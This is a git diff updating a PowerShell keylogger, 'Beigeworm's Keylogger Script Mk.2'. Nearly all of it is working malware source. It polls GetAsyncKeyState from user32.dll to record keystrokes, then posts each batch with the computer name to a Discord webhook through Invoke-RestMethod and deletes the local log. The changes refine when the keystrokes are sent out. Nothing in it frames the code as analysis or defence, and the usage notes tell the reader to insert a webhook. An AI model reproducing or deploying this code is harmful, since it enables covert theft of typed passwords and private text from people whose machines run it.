@@ -3,7 +3,7 @@
 ============================================= Beigeworm's Keylogger Script Mk.2 ========================================================
 
 SYNOPSIS
-This script gathers Keypress information and posts to a discord webhook address with the results every 50 keys pressed.
+This script gathers Keypress information and posts to a discord webhook address with the results after every 50 keys pressed.
 
 USAGE
 1. Input your credentials below
@@ -16,7 +16,7 @@ USAGE
 $hookurl = "DICORD_WEBHOOK_HERE"
 $Amount = 50  #Change this value to the amount of keys to save before sending to the webhook.
 
-# Import TypeDefinitions for keyboard inputs
+# Import DLL Definitions for keyboard inputs
 $API = @'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
 public static extern short GetAsyncKeyState(int virtualKeyCode); 
@@ -36,8 +36,9 @@ $charCount = 0
 $fileContent = Get-Content -Path $logPath -Raw
 
 # Start a continuous loop
-While ($true){try{
-
+While ($true){
+$keyPressed = $false
+try{
 # Start a loop that checks the amount of keys to save before message is sent
 while ($charCount -lt $Amount) {
 
@@ -50,6 +51,7 @@ $keyst = $API::GetAsyncKeyState($asc)
 
 # If a key is pressed
 if ($keyst -eq -32767) {
+$keyPressed = $true
 $null = [console]::CapsLock
 
 # Translate the keycode to a letter
@@ -71,14 +73,17 @@ if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0))
 }}}}}finally{
 
 # Send the saved keys to a webhook
+If ($keyPressed) {
 $fileContent = Get-Content -Path $logPath -Raw
 $escmsgsys = $fileContent -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
 $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsgsys} | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+Remove-Item -Path $logPath -Force
+$keyPressed = $false
+}
 }
 # reset counter and delete log file to restart loop
 $charCount = 0
-Remove-Item -Path $logPath -Force
 Start-Sleep -Milliseconds 10
 }
 
